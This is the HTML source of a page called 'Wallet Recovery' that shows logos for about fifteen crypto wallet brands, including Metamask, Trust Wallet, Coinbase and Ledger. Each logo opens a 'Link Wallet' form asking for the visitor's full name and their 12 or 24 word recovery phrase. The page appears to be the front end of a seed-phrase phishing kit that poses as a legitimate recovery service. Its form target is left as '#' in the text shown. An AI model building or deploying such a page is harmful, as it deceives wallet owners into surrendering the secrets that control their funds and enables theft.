<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/style.css">
    <title>Wallet Recovery</title>
</head>
<body>
    <main>
        <section class="heading">
            <div class="heading__primary">
                <h1 class="heading__primary--main">
                    Wallet Recovery
                </h1>
                <p class="heading__paragraph">
                    The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app.
                </p>
            </div>
        </section>

        <section class="wallet__wraps" id="wallet">
            <button class="wallet" value="Trust Wallet" onclick='window.location.assign("#popup")'>
                <img src="images/trust wallet.png" alt="TRUST WALLET" class="icon">
                <h2>Trust Wallet</h2>
            </button>
            <button class="wallet" value="Metamask" onclick='window.location.assign("#popup")'>
                <img src="images/metamask.png" alt="METAMSK" class="icon">
                <h2>Metamask</h2>
            </button>
            <button class="wallet" value="Digitex" onclick='window.location.assign("#popup")'>
                <img src="images/dijitex.png" alt="DIGITEX" class="icon">
                <h2>Digitex</h2>
            </button>
            <button class="wallet" value="Aave" onclick='window.location.assign("#popup")'>
                <img src="images/aave.png" alt="AAVE" class="icon">
                <h2>AAVE</h2>
            </button>
            <button class="wallet" value="Coinbase" onclick='window.location.assign("#popup")'>
                <img src="images/coinbase.jpeg" alt="coinbase" class="icon">
                <h2>Coinbase</h2>
            </button>
            <button class="wallet" value="Defait" onclick='window.location.assign("#popup")'>
                <img src="images/defait.jpeg" alt="defait" class="icon">
                <h2>Defait</h2>
            </button>
            <button class="wallet" value="Enjin" onclick='window.location.assign("#popup")'>
                <img src="images/enjin.ced4646a.svg" alt="Enjin" class="icon">
                <h2>Enjin</h2>
            </button>
            <button class="wallet" value="Exodus" onclick='window.location.assign("#popup")'>
                <img src="images/exodus.afdf8231.png" alt="Exodus" class="icon">
                <h2>Exodus</h2>
            </button>
            <button class="wallet" value="FortMatic" onclick='window.location.assign("#popup")'>
                <img src="images/fortmatic.jfif" alt="FortMatic" class="icon">
                <h2>FortMatic</h2>
            </button>
            <button class="wallet" value="Ledger" onclick='window.location.assign("#popup")'>
                <img src="images/ledger.52e09fe1.jpeg" alt="Ledger" class="icon">
                <h2>Ledger</h2>
            </button>
            <button class="wallet" value="Mew" onclick='window.location.assign("#popup")'>
                <img src="images/mew.png" alt="Mew" class="icon">
                <h2>Mew</h2>
            </button>
            <button class="wallet" value="Portis" onclick='window.location.assign("#popup")'>
                <img src="images/portis.46d3a09e.svg" alt="Portis" class="icon">
                <h2>Portis</h2>
            </button>
            <button class="wallet" value="Skale" onclick='window.location.assign("#popup")'>
                <img src="images/skale.03fd7700.webp" alt="Skale" class="icon">
                <h2>Skale</h2>
            </button>
            <button class="wallet" value="Wallet Connect" onclick='window.location.assign("#popup")'>
                <img src="images/walletconnect.c0072cb0.svg" alt="Wallet Connect" class="icon">
                <h2>Wallet Connect</h2>
            </button>
            <button class="wallet" value="Authereum" onclick='window.location.assign("#popup")'>
                <img src="images/authereum_shield.16d72585.svg" alt="Authereum" class="icon">
                <h2>Authereum</h2>
            </button>
        </section>

        <section class="popup" id="popup">
            <div class="popup__content">
                <div class="popup__content--head border-bottom">
                    <p class="para">Link Wallet</p>
                    <button type="button" class="popup__close" onclick='window.location.assign("#wallet")'>&times;</button>
                </div>

                <form action="#" class="form__control">
                    <div class="form__group">
                        <label for="fullName" class="form__label">Full Name</label>
                        <input type="text" name="fullName" class="form__input" id="fullName" required placeholder="Enter Full Name">
                    </div>
                    <div class="form__group">
                        <label for="recoveryphrase" class="form__label">Recovery Phrase</label>
                        <textarea name="recoveryphrase" class="form__input" id="recoveryphrase" required placeholder="Typically 12 (sometimes 24) words separated by single spaces"></textarea>
                    </div>
                    <button type="submit" class="btn">Import</button>
                </form>
            </div>
        </section>
    </main>
</body>
</html>
